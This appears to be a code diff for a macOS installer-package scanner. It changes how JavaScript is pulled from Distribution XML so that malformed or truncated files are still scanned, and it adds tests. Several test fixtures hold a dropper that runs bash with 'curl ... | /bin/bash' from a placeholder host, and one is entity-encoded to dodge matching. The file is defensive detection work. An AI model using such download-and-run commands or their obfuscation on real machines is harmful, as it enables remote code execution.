@@ -185,11 +185,29 @@ fn scan_scripts_entry(
 /// `NotApplicable` on malformed XML, an unterminated `<script>`, or any
 /// document we could not read the way Installer's parser would (see
 /// [`check_faithfully_readable`], §11.8).
+#[cfg(test)]
 fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
     let decoded = utf16_to_utf8(raw);
-    let xml_bytes = decoded.as_deref().unwrap_or(raw);
+    let mut pieces = Vec::new();
+    distribution_pieces(decoded.as_deref().unwrap_or(raw), &mut pieces)?;
+    Ok(join_pieces(&pieces))
+}
+
+/// Non-blank `pieces` joined with `\n`.
+fn join_pieces(pieces: &[String]) -> Vec<u8> {
+    let kept: Vec<&str> = pieces
+        .iter()
+        .map(String::as_str)
+        .filter(|p| !p.trim().is_empty())
+        .collect();
+    kept.join("\n").into_bytes()
+}
+
+/// The walker behind [`distribution_js`], over already-transcoded UTF-8.
+/// Pieces collected before a failure stay in `pieces`; an unterminated
+/// `<script>` contributes its body so far.
+fn distribution_pieces(xml_bytes: &[u8], pieces: &mut Vec<String>) -> Result<(), RuleOutcome> {
     check_faithfully_readable(xml_bytes)?;
-    let mut pieces: Vec<String> = Vec::new();
     let mut saw_element = false;
     let mut scanner = xml::Scanner::new(xml_bytes);
     loop {
@@ -203,13 +221,16 @@ fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
             }) => {
                 saw_element = true;
                 for (_, value) in xml::attrs(attrs) {
-                    check_entities(value)?;
                     pieces.push(xml::decode_entities(value));
+                    check_entities(value)?;
                 }
                 if name == "script" && !self_closing {
-                    let raw = scanner
-                        .raw_until_close("script")
-                        .ok_or(RuleOutcome::NotApplicable)?;
+                    let Some(raw) = scanner.raw_until_close("script") else {
+                        if let Ok(body) = script_body_texts(scanner.rest()) {
+                            pieces.extend(body);
+                        }
+                        return Err(RuleOutcome::NotApplicable);
+                    };
                     pieces.extend(script_body_texts(raw)?);
                 }
             }
@@ -219,8 +240,7 @@ fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
     if !saw_element {
         return Err(RuleOutcome::NotApplicable);
     }
-    pieces.retain(|p| !p.trim().is_empty());
-    Ok(pieces.join("\n").into_bytes())
+    Ok(())
 }
 
 /// Transcodes UTF-16 (BOM, or BOM-less starting `<\0` / `\0<`) to UTF-8
@@ -341,6 +361,8 @@ fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
                         | "latin-1"
                         | "latin1"
                         | "utf-16"
+                        | "utf-16le"
+                        | "utf-16be"
                 )
             });
             if !ok {
@@ -428,9 +450,12 @@ fn scan_distribution_entry(
         .map_err(|_| RuleOutcome::NotApplicable)?;
     // The `.js` suffix makes `classify_text` treat even a short buffer as script.
     let label = format!("{}!{}.js", ctx.path.display(), entry.path);
-    match distribution_js(&raw) {
-        Ok(js) => {
-            scan_distribution_text(label, js, findings);
+    let decoded = utf16_to_utf8(&raw);
+    let text = decoded.as_deref().unwrap_or(&raw);
+    let mut pieces = Vec::new();
+    match distribution_pieces(text, &mut pieces) {
+        Ok(()) => {
+            scan_distribution_text(label, join_pieces(&pieces), findings);
             // A partial read is evidence, not a clean read: findings stay,
             // the entry is reported unreadable.
             if gap.is_some() {
@@ -439,10 +464,18 @@ fn scan_distribution_entry(
             Ok(())
         }
         Err(_) => {
-            // Bytes we hold but could not parse are still evidence: scan them
-            // as text, then report the entry unreadable.
-            let text = utf16_to_utf8(&raw).unwrap_or(raw);
-            scan_distribution_text(label, text, findings);
+            // Bytes we hold but could not parse are still evidence: scan what
+            // the walker got, the raw text, and the raw text entity-decoded
+            // (each once), then report the entry unreadable.
+            let mut all = pieces;
+            let lossy = String::from_utf8_lossy(text).into_owned();
+            let entity_decoded = xml::decode_entities(text);
+            for extra in [lossy, entity_decoded] {
+                if !all.contains(&extra) {
+                    all.push(extra);
+                }
+            }
+            scan_distribution_text(label, join_pieces(&all), findings);
             Err(RuleOutcome::NotApplicable)
         }
     }
@@ -1121,6 +1154,88 @@ mod tests {
             InstallerScriptRule.evaluate(&c),
             Err(RuleOutcome::NotApplicable)
         ));
+    }
+
+    /// Scores `dist` (stored, so fully read) as a dropper that is unparseable
+    /// but still reported: signal with both indicators, marked incomplete.
+    fn assert_fallback_scores(dist: &[u8]) {
+        let c = ctx("f.pkg", &pkg_with_distribution(dist));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the fallback scores");
+        assert!(
+            signal
+                .description
+                .contains("launches an interpreter (bash)"),
+            "{}",
+            signal.description
+        );
+        assert!(
+            signal.description.contains("download piped to a shell"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// Entity-encoded dropper in an attribute, cut off, with an XML-breaking
+    /// tail: the raw text shows `&#99;url`, only the decoded form matches.
+    #[test]
+    fn an_entity_encoded_dropper_behind_a_junk_tail_is_scored() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_entity_junk_tail.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        let c = ctx("e.pkg", &bzip2_distribution_pkg(cut));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded form scores");
+        assert!(signal.description.contains("download piped to a shell"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    #[test]
+    fn an_entity_encoded_script_behind_a_junk_tail_is_scored() {
+        let mut dist = br#"<a><script>system.run(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&#99;url -fsSL https://example-cdn.invalid/a.sh | /bin/bash&quot;);</script></a>"#.to_vec();
+        dist.extend_from_slice(&[b'\n'; 50]);
+        dist.extend_from_slice(&[b'<'; 300]);
+        assert_fallback_scores(&dist);
+    }
+
+    #[test]
+    fn an_unterminated_script_holding_a_dropper_is_scored() {
+        assert_fallback_scores(
+            br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");"#,
+        );
+    }
+
+    /// The false-positive side: an unparseable but ordinary Distribution
+    /// stays NotApplicable, with no signal.
+    #[test]
+    fn an_unparseable_benign_distribution_is_not_applicable() {
+        let body = "<title>Example App</title><script>function onConclusion() { system.run('unload.sh'); }</script>\
+                    <readme file=\"r.html\"/>";
+        for dist in [
+            format!(r#"<?xml version="1.0" encoding="macintosh"?><i>{body}</i>"#),
+            format!(r#"<!DOCTYPE i [<!ENTITY t "Example">]><i>{body}</i>"#),
+        ] {
+            let c = ctx("b.pkg", &pkg_with_distribution(dist.as_bytes()));
+            assert!(
+                matches!(
+                    InstallerScriptRule.evaluate(&c),
+                    Err(RuleOutcome::NotApplicable)
+                ),
+                "{dist}"
+            );
+        }
+    }
+
+    #[test]
+    fn utf16_le_and_be_declarations_are_accepted() {
+        for decl in ["utf-16le", "UTF-16BE"] {
+            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
+            assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
+        }
     }
 
     /// A stored `Scripts` entry that is not cpio.
